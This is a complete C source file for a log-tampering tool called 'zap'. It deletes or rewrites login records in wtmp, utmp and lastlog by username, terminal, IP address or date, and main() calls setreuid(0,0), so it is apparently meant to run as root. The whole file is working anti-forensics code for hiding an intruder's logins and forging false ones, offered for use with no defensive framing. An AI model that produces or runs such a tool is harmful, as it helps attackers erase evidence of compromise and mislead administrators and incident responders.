#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <utmp.h>
#include <lastlog.h>
#include <pwd.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>

#define bzero(x, y) memset(x, 0, y)

int f;

const char* WTMP = "/var/log/wtmp";
const char* LASTLOG = "/var/log/lastlog";
const char* UTMP = "/run/utmp";

char Aflg = 0;
char Rflg = 0;
char aflg = 0;
char tflg = 0;
char dflg = 0;
char isIP = 0;

char* username[2] = { NULL,NULL };
char* terminal[2] = { NULL,NULL };
char* date[2] = { NULL,NULL };

char userIdx = 0;
char terminalIdx = 0;
char dateIdx = 0;

int year1 = 0;
int year2 = 0;
int month1 = 0;
int month2 = 0;
int day1 = 0;
int day2 = 0;

void usage()
{
    puts("Usage ./zap [OPTION]");
    puts("OPTIONS");
    puts("-A [username]	delete every logs with username");
    puts("-t [terminal name] delete every logs with terminal name");
    puts("-t [IP addr] delete every logs with IP address");
    puts("-d [mmddyy] delete every logs with mmddyy date");
    puts("-a [username]	[options] delete every logs with given options");
    puts("-R [username1] [username2] [options] replace logs with given options");
    puts("\nYou can't use A option with other options");
    puts("You can't use R option and a option both at one time");
    puts("You can't use t or d option without R or a option");
}

int nonstrlen(char* s)
{
    int i;
    for (i = 0; s[i] != 0; i++);
    return i;
}

void find_latest(char* name, struct utmp* latest)
{
    struct utmp utmp_ent;
    unsigned long long max = 0;
    bzero(latest, sizeof(struct utmp));

    int tmp = open(WTMP, O_RDWR);
    if (tmp < 0)
        exit(0);

    while (read(tmp, &utmp_ent, sizeof(utmp_ent)) > 0)
    {
        int len1 = nonstrlen(utmp_ent.ut_name);
        int len2 = strlen(name);
        int cmp_len = (len1 > len2) ? len1 : len2;
        if (!strncmp(utmp_ent.ut_name, name, cmp_len))
        {
            if (max < utmp_ent.ut_time)
            {
                max = utmp_ent.ut_time;
                bzero(latest, sizeof(struct utmp));
                strncpy(latest->ut_line, utmp_ent.ut_line, nonstrlen(utmp_ent.ut_line));
                strncpy(latest->ut_name, utmp_ent.ut_name, nonstrlen(utmp_ent.ut_name));
                strncpy(latest->ut_host, utmp_ent.ut_host, nonstrlen(utmp_ent.ut_host));
                latest->ut_time = max;
            }
        }
    }
    close(tmp);
}

void kill_tmp(const char* name)
{
    struct utmp utmp_ent;
    struct passwd* pwd;

    f = open(name, O_RDWR);
    if (f < 0)
        exit(0);

    char* who = username[0];

    if (Aflg || aflg || Rflg)
    {
        if ((pwd = getpwnam(who)) == NULL)  	// to prevent modifying to non-valid user.
        {
            printf("%s: ?\n", who);
            close(f);
            exit(0);
        }
    }


    int size = lseek(f, 0, SEEK_END);
    lseek(f, 0, SEEK_SET);

    if (Aflg)
    {
        while (read(f, &utmp_ent, sizeof(utmp_ent)) > 0)
        {
            int len1 = nonstrlen(utmp_ent.ut_name);
            int len2 = strlen(who);
            int cmp_len = (len1 > len2) ? len1 : len2;
            if (!strncmp(utmp_ent.ut_name, who, cmp_len))
            {
                int cur = lseek(f, 0, SEEK_CUR);
                int len = size - cur;
                char* buf = (char*)malloc(len + 1);
                bzero(buf, len + 1);
                read(f, buf, len);
                lseek(f, cur - (sizeof(utmp_ent)), SEEK_SET);
                write(f, buf, len);
                free(buf);
                ftruncate(f, size - (sizeof(utmp_ent)));
                size = lseek(f, 0, SEEK_END);
                lseek(f, 0, SEEK_SET);
            }
        }
    }
    if (Rflg)
    {
        if ((pwd = getpwnam(username[1])) == NULL)  	// to prevent modifying to non-valid user.
        {
            printf("%s: ?\n", username[1]);
            close(f);
            exit(0);
        }

        while (read(f, &utmp_ent, sizeof(utmp_ent)) > 0)
        {
            int len1 = nonstrlen(utmp_ent.ut_name);
            int len2 = strlen(who);
            int cmp_len = (len1 > len2) ? len1 : len2;

            if (!strncmp(utmp_ent.ut_name, who, cmp_len))
            {
                bzero(utmp_ent.ut_name, UT_NAMESIZE);
                strncpy(utmp_ent.ut_name, username[1], UT_NAMESIZE - 1);
                if (tflg)
                {
                    if(!isIP)
                    {
                        len1 = nonstrlen(utmp_ent.ut_line);
                        len2 = strlen(terminal[0]);
                        cmp_len = (len1 > len2) ? len1 : len2;
                        if (strncmp(utmp_ent.ut_line, terminal[0], cmp_len))
                            continue;

                        bzero(utmp_ent.ut_line, UT_LINESIZE);
                        strncpy(utmp_ent.ut_line, terminal[1], UT_LINESIZE - 1);
                    }
                    else
                    {
                        len1 = nonstrlen(utmp_ent.ut_host);
                        len2 = strlen(terminal[0]);
                        cmp_len = (len1 > len2) ? len1 : len2;
                        if (strncmp(utmp_ent.ut_host, terminal[0], cmp_len))
                            continue;

                        bzero(utmp_ent.ut_host, UT_HOSTSIZE);
                        strncpy(utmp_ent.ut_host, terminal[1], UT_HOSTSIZE - 1);

                        char ip_addr[UT_HOSTSIZE] = {0};
                        strncpy(ip_addr,terminal[1],UT_HOSTSIZE-1);
                        char *ip = strtok(ip_addr,".");
                        unsigned int tmp = 0,i;
                        for(i=0; i<4; i++)
                        {
                            tmp += (atoi(ip) << (i*8));
                            ip = strtok(NULL,".");
                        }
                        utmp_ent.ut_addr_v6[0] = tmp;
                    }
                }
                if (dflg)
                {
                    time_t t = utmp_ent.ut_time;
                    struct tm* tmdate = localtime(&t);
                    struct tm change_date = { 0 };
                    if (tmdate->tm_year == (year1 - 1900) && tmdate->tm_mon == (month1 - 1) && tmdate->tm_mday == day1)
                    {
                        change_date.tm_year = year2 - 1900;
                        change_date.tm_mon = month2 - 1;
                        change_date.tm_mday = day2;
                        t = mktime(&change_date);
                        utmp_ent.ut_time = t;
                    }
                    else
                        continue;
                }
                lseek(f, -(sizeof(utmp_ent)), SEEK_CUR);
                write(f, &utmp_ent, sizeof(utmp_ent));
            }
        }
    }
    if (aflg)
    {
        while (read(f, &utmp_ent, sizeof(utmp_ent)) > 0)
        {
            int len1 = nonstrlen(utmp_ent.ut_name);
            int len2 = strlen(who);
            int cmp_len = (len1 > len2) ? len1 : len2;

            if (!strncmp(utmp_ent.ut_name, who, cmp_len))
            {
                if (tflg)
                {
                    if(!isIP)
                    {
                        len1 = nonstrlen(utmp_ent.ut_line);
                        len2 = strlen(terminal[0]);
                        cmp_len = (len1 > len2) ? len1 : len2;
                        if (strncmp(utmp_ent.ut_line, terminal[0], cmp_len))
                            continue;
                    }
                    else
                    {
                        len1 = nonstrlen(utmp_ent.ut_host);
                        len2 = strlen(terminal[0]);
                        cmp_len = (len1 > len2) ? len1 : len2;
                        if (strncmp(utmp_ent.ut_host, terminal[0], cmp_len))
                            continue;
                    }
                }
                if (dflg)
                {
                    time_t t = utmp_ent.ut_time;
                    struct tm* tmdate = localtime(&t);
                    if (!(tmdate->tm_year == (year1 - 1900) && tmdate->tm_mon == (month1 - 1) && tmdate->tm_mday == day1))
                        continue;
                }
                int cur = lseek(f, 0, SEEK_CUR);
                int len = size - cur;
                char* buf = (char*)malloc(len + 1);
                bzero(buf, len + 1);
                read(f, buf, len);
                lseek(f, cur - (sizeof(utmp_ent)), SEEK_SET);
                write(f, buf, len);
                free(buf);
                ftruncate(f, size - (sizeof(utmp_ent)));
                size = lseek(f, 0, SEEK_END);
                lseek(f, 0, SEEK_SET);
            }
        }
    }
    close(f);
}

void kill_lastlog()
{
    struct passwd* pwd;
    struct lastlog newll;
    struct utmp latest;

    char* who = username[0];
    if(Aflg || Rflg || aflg)
        pwd = getpwnam(who);    // no need to double check pwd because already checked at kill_tmp
    if (Aflg)
    {
        if ((f = open(LASTLOG, O_RDWR)) >= 0)
        {
            lseek(f, (long)pwd->pw_uid * sizeof(struct lastlog), 0);
            bzero((char*)&newll, sizeof(newll));
            write(f, (char*)&newll, sizeof(newll));
            close(f);
        }
    }
    else if (Rflg || aflg)
    {
        if ((f = open(LASTLOG, O_RDWR)) >= 0)
        {
            find_latest(username[0], &latest);	// find latest log after modification

            lseek(f, (long)pwd->pw_uid * sizeof(struct lastlog), 0);
            bzero(&newll, sizeof(newll));
            newll.ll_time = latest.ut_time;
            strncpy(newll.ll_line, latest.ut_line, nonstrlen(latest.ut_line));
            strncpy(newll.ll_host, latest.ut_host, nonstrlen(latest.ut_host));
            write(f, (char*)&newll, sizeof(newll));

            if (Rflg)
            {
                bzero(&latest, sizeof(latest));
                find_latest(username[1], &latest);
                pwd = getpwnam(username[1]);
                lseek(f, (long)pwd->pw_uid * sizeof(struct lastlog), 0);
                bzero(&newll, sizeof(newll));
                newll.ll_time = latest.ut_time;
                strncpy(newll.ll_line, latest.ut_line, nonstrlen(latest.ut_line));
                strncpy(newll.ll_host, latest.ut_host, nonstrlen(latest.ut_host));
                write(f, (char*)&newll, sizeof(newll));
            }
            close(f);
        }
    }
}

void check_leap_year(int year, int month, int day)
{
    char leap = 0;
    if (year % 4 == 0 && year % 100 != 0)
        leap = 1;
    if (year % 400 == 0)
        leap = 1;

    if (!leap)
    {
        if (month == 2 && day >= 29)
        {
            puts("wrong date..");
            exit(0);
        }
    }
}

void check_time(char* time_check, char* date, char num)
{
    int i;
    int month, day, year;
    for (i = 0; i < 3; i++)
    {
        if (i == 0)  	//mm
        {
            strncpy(time_check, date, 2);
            month = atoi(time_check);
            if (month <= 0 || month > 12)
            {
                puts("wrong date..");
                exit(0);
            }
        }
        else if (i == 1)  	//dd
        {
            strncpy(time_check, date + 2, 2);
            day = atoi(time_check);
            if (month == 2)
            {
                if (day <= 0 || day > 29)
                {
                    puts("wrong date..");
                    exit(0);
                }
            }
            else if (month == 4 || month == 6 || month == 9 || month == 11)
            {
                if (day <= 0 || day > 30)
                {
                    puts("wrong date..");
                    exit(0);
                }
            }
            else
            {
                if (day <= 0 || day > 31)
                {
                    puts("wrong date..");
                    exit(0);
                }
            }
        }
        else  	//yy
        {
            strncpy(time_check, date + 4, 2);
            year = atoi(time_check);
            if (year < 0)
            {
                puts("wrong date..");
                exit(0);
            }
            if (year >= 70 && year < 100)
                year += 1900;
            else if (year >= 0 && year <= 38)
                year += 2000;
            else
            {
                puts("wrong date..");
                exit(0);
            }
            if (year == 2038)
            {
                if (month > 1 || (month == 1 && day > 19))
                {
                    puts("wrong date..");
                    exit(0);
                }
            }
            check_leap_year(year, month, day);
        }
    }
    if (num == 0)
    {
        year1 = year;
        month1 = month;
        day1 = day;
    }
    else
    {
        year2 = year;
        month2 = month;
        day2 = day;
    }
}
void check_ip()
{
    int i;
    int cnt = 0;
    for(i=0; i<strlen(terminal[0]); i++)
        if(terminal[0][i] == '.')
            cnt++;

    if(cnt == 3)
        isIP = 1;

    if(isIP && Rflg)
    {
        cnt = 0;
        for(i=0; i<strlen(terminal[1]); i++)
            if(terminal[1][i] == '.')
                cnt++;

        if(cnt!=3)
        {
            puts("wrong ip format");
            exit(0);
        }
    }
    else if(!isIP && Rflg)
    {
        cnt = 0;
        for(i=0; i<strlen(terminal[1]); i++)
            if(terminal[1][i] == '.')
                cnt++;
        if(cnt == 3)
        {
            puts("wrong terminal format");
            exit(0);
        }
    }
}
void check_flg()
{

    if (aflg && Rflg)  	//Rflg, aflg both can't be on
    {
        puts("a option and R option can't be on both");
        exit(0);
    }

    if (!aflg && !Rflg)   //prevent only tflg, dflg is on when aflg and Rflg are both off.
    {
        if (tflg || dflg)
        {
            puts("t option and d option can't be on without a option or R option");
            exit(0);
        }
    }

    if(Rflg)
    {
        if (userIdx != 2)
        {
            puts("username argument missing..");
            exit(0);
        }

        if (tflg && terminalIdx != 2)
        {
            puts("terminal name argument missing..");
            exit(0);
        }

        if (dflg && dateIdx != 2)
        {
            puts("date argument missing..");
            exit(0);
        }
    }


    if(tflg)
        check_ip();

    char time_check[3] = { 0 };
    int month=0, day=0, year=0;
    if (dflg)
    {
        int len1 = strlen(date[0]);
        if (Rflg)
        {
            int len2 = strlen(date[1]);
            if (len1 != 6 || len2 != 6)
            {
                puts("wrong date format! [mmddyy]");
                exit(0);
            }
            check_time(time_check, date[1], 1);
        }
        else
        {
            if (len1 != 6)
            {
                puts("wrong date format! [mmddyy]");
                exit(0);
            }
        }
        check_time(time_check, date[0], 0);
    }
}
char is_option(char* s)	//check is s an option
{
    if (!strcmp(s, "-A") || !strcmp(s, "-a") || !strcmp(s, "-t") || !strcmp(s, "-d") || !strcmp(s, "-R"))
        return 1;
    return 0;
}

char check_arg(char* s)
{
    if (s == NULL)
        return 0;
    if (is_option(s))
        return 0;
    else
        return 1;
}

int main(int argc, char* argv[])
{
    char opt;
    setreuid(0, 0);
    if (argc < 2)
    {
        usage();
        exit(0);
    }

    while ((opt = getopt(argc, argv, "AatdR")) != -1)
    {
        switch (opt)
        {
        case 'A':
            if(argc!=3)
            {
                usage();
                exit(0);
            }
            if (check_arg(argv[optind]))
            {
                Aflg = 1;
                username[userIdx++] = argv[optind];
                kill_tmp(WTMP);
                kill_tmp(UTMP);
                kill_lastlog();
                exit(0);
            }
            else
            {
                usage();
                exit(0);
            }
            break;
        case 'a':
            if (check_arg(argv[optind]))
            {
                aflg = 1;
                username[userIdx++] = argv[optind];
            }
            break;
        case 't':
            if (check_arg(argv[optind]))
            {
                tflg = 1;
                terminal[terminalIdx++] = argv[optind];
            }
            if (check_arg(argv[optind + 1]))
            {
                terminal[terminalIdx++] = argv[optind + 1];
            }
            break;
        case 'd':
            if (check_arg(argv[optind]))
            {
                dflg = 1;
                date[dateIdx++] = argv[optind];
            }
            if (check_arg(argv[optind + 1]))
            {
                date[dateIdx++] = argv[optind + 1];
            }
            break;
        case 'R':
            if (check_arg(argv[optind]) && check_arg(argv[optind + 1]))
            {
                Rflg = 1;
                username[userIdx++] = argv[optind];
                username[userIdx++] = argv[optind + 1];
            }
            else
            {
                usage();
                exit(0);
            }
            break;
        default:
            usage();
            exit(0);
        }
    }

    check_flg();

    kill_tmp(WTMP);
    kill_tmp(UTMP);
    kill_lastlog();

    return 0;
}
